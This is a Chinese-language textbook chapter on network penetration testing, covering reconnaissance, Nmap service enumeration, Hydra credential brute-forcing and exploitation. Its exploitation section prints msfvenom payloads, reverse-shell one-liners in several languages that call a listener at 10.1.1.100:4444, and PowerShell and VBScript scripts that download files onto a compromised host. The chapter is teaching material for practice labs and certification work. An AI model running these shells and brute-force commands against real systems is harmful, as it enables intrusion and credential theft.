# 第九章：网络渗透测试

要做好准备——这将是一个庞大的章节！事实上，这一章的内容相当于一本书的内容。为什么呢？因为我希望它能成为你未来职业生涯中的参考资料。网络漏洞评估和渗透测试将是你从事 web 应用安全工作时的主要任务之一。假设你在一个容易受到攻击的操作系统上部署了 web 应用，而且该系统可以从互联网访问——这对一个想要远程获取你公司服务器的黑客来说，简直是圣诞礼物。

市面上大多数关于互联网安全的书籍都会讨论这个话题（使用 Kali Linux 进行渗透测试），所以我问自己，*在写这章之前*，*我如何将它用于自己的日常安全测试呢？* 我希望它尽可能对你有用，这样你就可以在实践中应用它，用于你的日常工作以及渗透测试认证。

你可以将这一章和下一章作为作弊手册，来练习你的渗透测试技能。你可以通过下载易受攻击的虚拟机并尝试利用它们，来提升你的黑客技能，这种方法称为**Capture the Flag**（**CTF**）。下载这些虚拟机的一个好网站是：[`www.vulnhub.com`](http://www.vulnhub.com)。

本书面向中级至高级的专业人士，旨在帮助他们增强和深化知识。如果你觉得本章的信息量庞大且不清晰，我建议你观看一些关于渗透测试的初学者在线课程。

让我们直接开始本章内容，以下是将要涵盖的主题：

+   被动信息收集

+   服务枚举

+   网络漏洞评估

+   漏洞利用

+   权限提升

# 被动信息收集 – 侦察 – OSINT

在渗透测试开始的第一步，你需要被动地收集关于目标公司范围的信息。为了完成这个任务，你将使用网络以及一些后台自动调用网络的工具。这个阶段也被称为收集**开放源代码情报**（**OSINT**）。OSINT 指的是从互联网上收集的信息。安全专业人员还称这一阶段为**侦察**。说实话，它们指的都是同一任务，但你需要知道在描述这个阶段时使用的不同术语。

如果你的目标是外部的 web 应用（无论是客户的目标，还是你所在组织的目标），那么你可以执行信息收集阶段，但如果你的目标是一个内网或一个尚未部署到生产环境的新网站，那么 OSINT 就没有用处，除非你的客户（或上司）单独要求你进行这项任务。

信息收集，或称为 OSINT，通常从对目标在线存在的网络研究开始。

您将使用公开信息收集以下内容：

+   公司信息，包括以下内容：

    +   位置和地址

    +   电子邮件地址（例如，`support@yourclientdomain.com`）

    +   其他收购的公司（双向—可能是您的客户被另一家公司收购，或反之亦然）

    +   域名（DNS）

    +   企业类型（银行、保险、零售等）

    +   公司结构

    +   公司的博客文章

    +   公司的社交网络数据

    +   网页上的缓存内容

    +   信息泄露（例如，密码、客户 PII 或任何不应公开的敏感信息）

+   员工信息，包括以下内容：

    +   姓名

    +   电子邮件地址

    +   电话号码

    +   公司内部的职位（例如，IT 经理、QA 工程师等）

    +   社交网络数据

+   Web 应用程序信息收集，包括以下内容：

    +   在数据泄露网站上发现基于 Web 的漏洞

    +   网页爬取

    +   使用的编程语言（例如 PHP、Java 或.NET）

    +   使用 Burp 进行被动扫描（我们将在下一章中详细讨论此主题）

一个好的起点是目标网站。在这里，您可以找到上述大部分信息。

# 网络搜索引擎

不要只使用 Google 作为您的在线研究唯一搜索引擎（仅输入目标的公司名称或域名即可获得搜索结果）。还有其他强大的搜索引擎，包括以下内容：

+   **中文搜索引擎**: [`www.baidu.com`](http://www.baidu.com)

+   **俄罗斯搜索引擎**: [`yandex.com`](http://yandex.com)

+   **常见的流行搜索引擎**: [`www.duckduckgo.com`](http://www.duckduckgo.com)

您还可以使用 TOR 网络进行暗网和深网搜索（请小心使用这些搜索引擎，因为此技术仍在发展中）：

+   **Onion.City**: [`onion.link/`](http://onion.link/)

+   **Not Evil**: [`hss3uro2hsxfogfq.onion.to/`](https://hss3uro2hsxfogfq.onion.to/)

+   **Onion.To**: [`tor2web.org/`](https://tor2web.org/)

+   **Duck Duck Go**: [`3g2upl4pq6kufc4m.onion/`](https://3g2upl4pq6kufc4m.onion/)

要连接到暗网，首先连接到 VPN，然后使用 TOR 浏览器连接到 TOR 网络。

# Google 黑客数据库 – Google dorks

Google 允许我们渗透测试人员按需查询其搜索引擎，以揭示有关目标的敏感信息。查找所有有趣查询的参考资料可以在 Exploit-DB 网站上找到，网址为：[`www.exploit-db.com/google-hacking-database/`](https://www.exploit-db.com/google-hacking-database/)。

在 Google 上能搜索什么？使用 Google dorks，您可以查询搜索引擎以完成以下操作：

+   在 Web 服务器上获取立足点

+   揭示敏感目录

+   搜索易受攻击的文件

+   搜索易受攻击的服务器

+   揭示冗长的错误信息

+   搜索目标网络的漏洞数据

+   搜索属于目标的各种设备（例如，IP 摄像头）

+   获取 Web 服务器信息

+   搜索包含凭证（用户名或密码）和机密信息的文件

+   搜索登录页面（或管理员页面）

以下是一些最流行的 Google dork 查询：

+   **搜索域名/子域名**：`site [目标域名]`

+   **搜索文件**：`filetype [文件扩展名]`

+   **在 URL 中搜索字符串**：`inurl [搜索标准在 URL 中]`

+   **在标题中搜索字符串**：`intitle [搜索标准在标题中]`

记住，你可以将多个查询组合在一起，以获得期望的结果。

# 在线工具

互联网中有一些不错的网站可以添加到你的工具库中：

+   **探索服务器和物联网设备的在线漏洞**：[`www.shodan.io`](https://www.shodan.io)

+   **获取泄露的已发布信息**：[`www.pastebin.com`](http://www.pastebin.com)

+   **文本和源代码泄漏**：[`github.com`](https://github.com)

+   **在线瑞士军刀工具**：[`www.dnsstuff.com`](https://www.dnsstuff.com)

+   **查找目标网站的有趣信息**：

    +   [https://toolbar.netcraft.com/site_report?url=**[目标域名]**](https://toolbar.netcraft.com/site_report?url=%5Btarget%20domain%20name%5D)

    +   [`searchdns.netcraft.com`](http://searchdns.netcraft.com)

# Kali Linux 工具

Kali Linux 包含许多用于信息收集的工具。有些工具可能会从 Kali 的仓库中移除，因此不会默认安装。我列出的大多数工具可以通过 GitHub 下载或简单的 Google 搜索找到（以防它们将来从 Kali Linux 发行版中移除）。另一个选择是通过你的终端窗口使用`apt-get install`命令来安装所需的工具。

# WHOIS 查询

每个域名都在公共 WHOIS 数据库中注册。根据查询的数据库，WHOIS 请求的响应将揭示很多有价值的信息，包括以下内容：

+   名称

+   电话号码

+   电子邮件地址

+   物理地址

+   域名到期日期

+   DNS 服务器

**示例**：

```
whois domain-name.com
```

# 域名系统 - DNS 枚举

DNS 枚举将揭示有关目标的域名和分配给它的 IP 地址的信息，以及我们与最终目的地之间的路由。

总结来说，**域名系统**（**DNS**）是一个数据库，将域名（例如，`google.com`）解析为其 IP 地址（`172.217.10.46`）。

你将使用 DNS 信息的原因如下：

+   确定 DNS 服务器是否允许区域传输。如果允许，它将揭示可通过互联网访问的系统的主机名和 IP 地址。

+   通过使用暴力破解的方法，该工具允许我们识别与目标关联的新域名或子域名。

+   查找可能存在漏洞的服务（例如，FTP）。

+   查找有趣的远程管理面板。

+   查找配置错误和/或测试服务器（`test.domain-name.com`）。

**工具/示例**：

```
dnsenum domain-name.com
fierce -dns domain-name.com
dnsrecon -w -d domain-name.com -t axfr

-w: will perform a deep whois analysis
-d: target domain name
-t: type of enumeration
axfr: Test all NS servers for a zone transfer
```

# 收集电子邮件地址

`theharvester` 脚本是一个 Python 工具/脚本，用于通过流行的搜索引擎搜索电子邮件地址和域名。

**示例**：

```
theharvester -d domain-name.com -l 500 -b google -h 
-d: is for the domain name
-l: in this case to limit the number of results to 100
-b: stands for the datasource, in this case we have chosen google but you have more options like (google,bing,bingapi,pgp,linkedin,google-profiles,people123,jigsaw,all)
-h: will use the SHODAN database to query the discovered hosts
```

# 主动信息收集 – 服务枚举

这个阶段主要是识别活跃主机及其上运行的服务。记住，在这个阶段，我们仍然在收集信息，用以了解我们的目标。一些企业环境中的人只是跳过这一步，直接执行高级扫描器进行漏洞评估，如 Nessus 或 Nexpose。我个人不喜欢这种做法，除非你的测试预算有限（这总比什么都不做好）。

这个阶段有四个步骤：

1.  从客户或雇主那里获取 IP 地址/范围（如果是内部项目，项目经理会提供帮助）

1.  识别活跃主机

1.  列出每个主机上的开放端口/服务

1.  对每个服务进行更多信息探测

请查看附录 A、B、C、D 和 E，了解渗透测试参考资料。

# 识别活跃主机

接下来，您将确定主机是否在线运行，或者是否受防火墙保护。我最喜欢用于这个阶段（以及后续阶段）的工具是 Nmap。我强烈建议您熟悉 Nmap。以下命令启动 Nmap 和另一个有用的主机标识工具：

+   **Nmap ping 扫描**：

```
nmap -sn [IP Address / range]
```

+   **另一个工具**，**Netdiscover**：

```
netdiscover -r [IP Address / range]
```

# 识别开放端口/服务

快速 ping 扫描后，我们还可以利用我们的方法揭示开放的端口和服务。我们还将使用 Nmap 脚本来探测每个服务，使用以下命令：

+   **TCP 扫描 - 内网**：

```
nmap -sS -sV -sC -sV --version-all -O --osscan-guess -T4 --reason --open -p- -Pn -v [IP address / range]
```

+   **UDP 扫描 - 内网**：

```
nmap -sU --top-ports 1000 -Pn -v [IP address / range]
```

+   **TCP 扫描 - 来自互联网（外部边界）**：

```
nmap -sS -T2 --top-ports 1000 -Pn -v [IP address / range]
```

+   **UDP 扫描 - 来自互联网（外部边界）**：

```
nmap -sU --top-ports 100 -Pn -v [IP address / range]
```

请查看 *附录 A*，获取 Nmap 的备忘单。

# 服务探测和枚举

在前一步中，我们使用 Nmap 脚本快速探测了我们发现的每个服务。在此步骤中，我们将把这些信息带入下一步，并尝试更具攻击性地探测。我们将在以下示例中使用的 Nmap 脚本既非常激进又非常耗时：

+   **端口 TCP 21 – FTP**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 21 -Pn -T5 --host-timeout 15m --script=ftp* -v [IP address]
```

+   +   **凭证暴力破解**：

```
hydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] ftp://[IP address]
```

+   **端口 TCP 22 – SSH**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 22 -Pn -T5 --host-timeout 15m --script=ssh* -v [IP address]
```

+   +   **凭证暴力破解**：

```
hydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] ssh://[IP address]
```

+   **端口 TCP 23 – Telnet**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 23 -Pn -T5 --host-timeout 15m --script=telnet* -v [IP address]
```

+   +   **凭证暴力破解**：

```
hydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] telnet://[IP address]
```

+   **端口 TCP 25 – SMTP**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 25 -Pn -T5 --host-timeout 15m --script=smtp* -v [IP address]
```

+   +   **连接到服务器并执行 VRFY 命令**：

```
telnet [IP] 25
Then execute the command once connected:
VRFY [user] (e.g. VRFY John)
```

+   **端口 TCP/UDP 53 – DNS**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 53 -Pn -T5 --host-timeout 15m --script=dns* -v [IP address]
```

+   **端口 TCP 80 – HTTP**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 80 -Pn -T5 --host-timeout 200m --script=http* -v [IP address]
```

+   +   **使用 Nikto 探测**：

```
nikto -host http://[IP address]
```

+   +   **使用 WhatWeb 探测**：

```
whatweb [IP address]
```

+   +   **目录爬行**：

```
gobuster -u http://[IP address]-w /usr/share/wordlists/dirb/common.txt -s '200,204,301,302,307,403,500' -e
```

+   **端口 TCP 110 – POP3**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 110 -Pn -T5 --host-timeout 15m --script=pop3* -v [IP address]
```

+   **端口 UDP 137、138，TCP 端口 137、139 – Netbios & TCP 445 – Samba（SMB）**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 139,445 -Pn -T5 --host-timeout 200m --script=smb* -v [IP address]
```

+   +   **使用 Enum4Linux 探测 SMB**：

```
enum4linux -a [IP address]
```

+   +   **使用 nmblookup 探测 SMB**：

```
nmblookup -A [IP address]
```

+   +   **使用 nbtscan 探测 Netbios**：

```
nbtscan -r [IP address]
```

+   +   **列出 SMB 共享**：

```
smbclient -L [IP address] -N
```

+   +   **连接到共享目录**：

```
smbclient //[IP address]/[Shared directory]
```

+   **端口 UDP 161 – SNMP**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 161 -Pn -T5 --host-timeout 15m --script=snmp* -v [IP address]
```

+   +   **枚举 MIB 树**：

```
snmpwalk -c public -v1 [IP address]
```

+   +   **使用 snmp-check 工具探测 SNMP**：

```
snmp-check -t [IP address]
```

+   **端口 TCP 389 – LDAP**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 389 -Pn -T5 --host-timeout 15m --script=ldap* -v [IP address]
```

+   **端口 TCP 443 – HTTPS/SSL**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 443 -Pn -T5 --host-timeout 15m --script=ssl* -v [IP address]
```

+   **端口 TCP 1433 – Microsoft SQL Server (MSSQL)**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 1433 -Pn -T5 --host-timeout 15m --script=ms-sql* -v [IP address]
```

+   +   **暴力破解凭据**：

```
hydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] mssql://[IP address]
```

+   **端口 TCP 3306 – MySQL**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 3306 -Pn -T5 --host-timeout 15m --script=mysql* -v [IP address]
```

+   +   **暴力破解凭据**：

```
hydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] mysql://[IP address]
```

+   **端口 TCP/UDP 3389 – 远程桌面协议 (RDP)**：

    +   **Nmap 脚本探测**：

```
nmap -sV -p 3389 -Pn -T5 --host-timeout 15m --script=rdp* -v [IP address]
```

+   +   **暴力破解凭据**：

```
hydra -t 10 -V -f -L [users dic file path] -P [passwords dic file path] rdp://[IP address]
```

# 漏洞评估

在上一节中，我们对服务进行了激进的枚举。一些 Nmap 脚本将检查漏洞——例如，当输入选项 `--script=http*` 时，Nmap 将执行所有 HTTP 脚本，包括那些检查漏洞的脚本，例如 `http-vuln-cve2010-2861`。

实际上，在企业环境中，我们会使用自动化扫描工具，通常是 Nessus 或 Nexpose。如今，这些公司也提供云端扫描服务——例如，Nexpose 的云端版本叫做 InsightVM。我们在很大程度上依赖这些扫描工具来识别网络基础设施中的漏洞。你的角色是获取扫描结果并确认这些漏洞确实存在——换句话说，就是确保它们不是误报。

# OpenVas

如果你想练习漏洞评估怎么办？你可以安装并使用一个免费的漏洞评估工具，叫做 OpenVas。要在 Kali Linux 上安装它，访问 [`www.kali.org/penetration-testing/openvas-vulnerability-scanning`](https://www.kali.org/penetration-testing/openvas-vulnerability-scanning)。

安装 OpenVas 时，别忘了保存生成的密码。通常，密码会在安装的最后一步显示。

使用 OpenVas 扫描 IP 地址或范围，执行以下步骤：

1.  确保 OpenVas 服务已经通过 `$ service openvas-manager start` 启动。

1.  使用 `firefox https://127.0.0.1:9392` 在浏览器中打开它。

1.  输入默认用户名 `admin` 和在安装过程中为你生成的密码。

1.  在菜单中，选择“配置”选项卡，然后选择“目标”。

1.  点击“新目标”按钮（按钮图标是一个蓝色星星，通常位于屏幕的左上角）添加新目标。

1.  在新的目标窗口中，确保填写以下内容：

    +   目标名称

    +   IP/范围

    +   端口列表

1.  保存目标后，选择“扫描”菜单并点击“任务”项。

1.  使用“新任务”按钮（蓝色星星图标）添加任务。

1.  确保为任务选择以下选项：

    +   名称

    +   指定之前创建的目标

    +   选择正确的扫描配置

1.  创建任务后，它应该出现在任务主页面。

1.  在“操作”列下，点击“开始”按钮（一个绿色的播放图标）。

1.  扫描器将在任务完成时在报告栏中显示“完成”状态。

1.  在报告栏下，点击链接以显示漏洞结果。

在开始利用阶段之前，我建议你先熟悉一下 Metasploit。查看*附录 B*以获取 Metasploit 的完整备忘单。

# 利用漏洞

利用阶段是通过利用目标机器上的漏洞并获得远程 Shell 来完成的。就是这么简单，没错吧？我们开始吧。

# 查找漏洞

一般来说，99%的情况下，漏洞扫描器会告诉你在哪里可以找到漏洞，方便你从自己这边进行复现。以下是大多数漏洞的来源：

+   Google 一下——听起来简单，但这是我最喜欢的方法

+   `Exploit-db` 网站 [`www.exploit-db.com`](http://www.exploit-db.com)

+   Kali Linux 中的 searchsploit 工具

+   Metasploit——使用`search`命令找到它

+   Security Focus 网站 [`www.securityfocus.com`](http://www.securityfocus.com)

+   有时你会在 GitHub 上找到它们，网址是[`www.github.com`](http://www.github.com)

# 监听器设置

在上传并执行有效载荷之前，你需要在 Kali Linux 上设置并执行一个监听器。

要使用**Metasploit**创建监听器，请输入以下命令：

```
use exploit/multi/handler set PAYLOAD [msfvenom Payload name] set LHOST [Kali IP address] set LPORT [Listening port on Kali] set ExitOnSession false exploit -j -z
```

要使用**netcat**创建监听器，请使用以下命令：

```
nc -nlvp [listening port on Kali]
```

# 使用 msfvenom 生成 Shell 有效载荷

现在我们来讨论如何在不同平台上使用`msfvenom`生成 Shell 有效载荷：

+   **Linux**:

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f elf > linux_shell.elf
```

+   **Windows**:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f exe > windows_shell.exe
```

+   **macOS**:

```
msfvenom -p osx/x86/shell_reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f macho > mac_shell.macho
```

+   **PHP**:

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f raw > php_shell.php
```

如果你使用`php`/`reverse_php`，那么打开`msfvenom`生成的输出文件，使用编辑器在脚本的开始加上`<?php`，并在末尾加上`?>`。

+   **ASP**:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f asp > asp_shell.asp
```

+   **JSP**:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=[Your Kali IP Address] LPORT=[Your Listening Port on Kali] -f raw > jsp_shell.jsp
```

# 自定义 Shell

如果你不想使用`msfvenom`，你可以创建你自己的自定义 Shell。这里有一些示例：

+   **Bash**

```
bash -i >& /dev/tcp/[Your Kali IP Address]/[Your Listening Port on Kali] 0>&1
```

在以下示例中，我假设我的 Kali IP 是`10.1.1.100`，监听端口是`4444`。

+   **PERL**

```
perl -e 'use Socket;$ip="10.1.1.100";$prt=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($prt,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

+   **Python**

```
python -c 'import socket,subprocess,os;skt=socket.socket(socket.AF_INET,socket.SOCK_STREAM);skt.connect(("10.1.1.100",4444));os.dup2(skt.fileno(),0); os.dup2(skt.fileno(),1); os.dup2(skt.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

说到 Python，如果你获得了远程 Shell，可以使用`python -c 'import pty; pty.spawn("/bin/sh")'`来生成 TTY Shell。

+   **PHP**

```
php -r '$sock=fsockopen("10.1.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

+   **Ruby**

```
ruby -rsocket -e'f=TCPSocket.open("10.1.1.100",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

+   **Netcat**

```
nc -e /bin/sh 10.1.1.100 4444
```

+   **Java**

```
rt = Runtime.getRuntime()
pc = rt.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.1.1.100/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
pc.waitFor()
```

# 权限提升

利用漏洞后，大多数情况下你将获得一个有限的 Shell。下一步是获取受害者机器上的管理员账户。为此，你需要选择以下方法之一：

+   将文件传输到受害者机器，以便获得 Root Shell（例如，Dirty COW）

+   复制粘贴适用于 Windows 操作系统的 PowerShell 有效载荷（例如，Empire PowerShell）

+   使用 Metasploit/Meterpreter 提升权限（参见*附录 B*）

+   手动搜索配置错误的参数，以便获得管理员/Root Shell

# 文件传输

让我们来看一个实际场景。假设你刚刚获得了受害者机器的有限 Shell，你知道操作系统是 Linux，并且想要将`Dirty COW`上传到远程服务器并执行。以下是这种方法的步骤：

1.  将`Dirty COW`二进制文件复制到目标 HTTP 目录，路径为`/var/www/html`。

1.  使用`$service apache2 start`启动 Web 服务器。

1.  通过受限 shell 使用以下命令将文件下载到受害者的机器上（我将文件下载到`/tmp`目录）：

    +   `cd /tmp`

    +   `$wget [http://Kali IP 地址/文件名]`

那么如果我想将文件传输到 Windows 机器呢？为此，我需要使用 PowerShell，如以下部分所示。

# 使用 PowerShell

在你的受限 shell 中执行以下命令来创建脚本：

```
echo $storageDir = $pwd > wget_win.ps1
echo $webclient = New-Object System.Net.WebClient >>wget_win.ps1
echo $url = "http://[kali IP]/file name" >>wget_win.ps1
echo $file = "get-admin.exe" >>wget_win.ps1
echo $webclient.DownloadFile($url,$file) >>wget_win.ps1
```

我选择了文件名`get-admin.exe`。你不必使用相同的名字；你可以使用任何你喜欢的名字。

接下来，使用`powershell.exe`执行脚本：

```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget_win.ps1
```

# 使用 VBScript

对于没有 PowerShell 的旧版 Windows，我们将使用 VBScript。第一步是创建脚本。然后，我们可以使用`cscript`命令执行它：

```
echo strUrl = WScript.Arguments.Item(0) > wget_win.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget_win.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget_win.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget_win.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget_win.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget_win.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget_win.vbs
echo Err.Clear >> wget_win.vbs
echo Set http = Nothing >> wget_win.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget_win.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget_win.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget_win.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget_win.vbs
echo http.Open "GET", strURL, False >> wget_win.vbs
echo http.Send >> wget_win.vbs
echo varByteArray = http.ResponseBody >> wget_win.vbs
echo Set http = Nothing >> wget_win.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget_win.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget_win.vbs
echo strData = "" >> wget_win.vbs
echo strBuffer = "" >> wget_win.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget_win.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget_win.vbs
echo Next >> wget_win.vbs
echo ts.Close >> wget_win.vbs
```

执行`wget_win.vbs`脚本：

```
cscript wget_win.vbs http://[Kali IP address]/[File Name] get-admin.exe
```

我选择了文件名`get-admin.exe`。你不必使用相同的名字；你可以使用任何你喜欢的名字。

# 管理员或 root 权限

输入所有这些命令是耗时的。为了更快地完成这个过程，最好的方法是通过前一部分中描述的方法上传一个脚本文件到受害者的机器，*文件传输*。网上最好的脚本可以从以下 GitHub 仓库下载：

+   **适用于 Windows**：[`github.com/pentestmonkey/windows-privesc-check`](https://github.com/pentestmonkey/windows-privesc-check)

+   **适用于 Linux**：[`github.com/pentestmonkey/unix-privesc-check`](https://github.com/pentestmonkey/unix-privesc-check)

如果你使用 Metasploit 并且拥有 Meterpreter 会话，请使用以下命令提升权限：

```
meterpreter > getsystem
```

请参阅*附录 B*，以获取 Metasploit/Meterpreter 权限提升的完整指南。

Windows 权限提升漏洞通常用 Python 编写。你可以下载`pyinstaller.py`将漏洞转换为可执行文件并上传到远程服务器，例如：

+   **安装 PyInstaller**：`$pip install pyinstaller`

+   **下载你的漏洞**：`$wget http://[漏洞 URL]`

+   **转换它**：`$python pyinstaller.py --onefile [python file.py]`

有些漏洞是用 C 语言编写的。要编译 C 语言二进制文件，请执行以下命令：

`$gcc -o [输出文件名] [原始二进制文件.c]`

# 总结

本章涵盖了许多话题，从信息收集到权限提升。我尽力涵盖了最重要的内容，并且直接切入重点，省略了琐碎的细节，以便在单章中最大限度地覆盖话题。

本章你学到的只是渗透测试的部分内容。事实上，本章我们只涉及了基于网络的评估。在下一章，我们将讨论基于 Web 应用的渗透测试。
